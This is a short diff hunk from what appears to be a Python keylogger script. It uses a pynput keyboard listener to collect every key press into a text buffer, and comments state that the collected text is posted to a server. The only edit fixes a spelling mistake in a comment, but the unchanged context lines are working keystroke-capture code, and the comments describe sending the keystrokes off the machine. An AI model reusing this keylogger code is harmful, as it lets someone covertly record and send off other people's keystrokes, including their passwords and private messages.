@@ -60,7 +60,7 @@ def on_press(key):
         text += str(key).strip("'")
 
 # A keyboard listener is a threading.Thread, and a callback on_press will be invoked from this thread.
-# In the on_press function wee specified how to deal with the different inputs received by the listener.
+# In the on_press function we specified how to deal with the different inputs received by the listener.
 with keyboard.Listener(
     on_press=on_press) as listener:
     # We start of by sending the post request to our server.
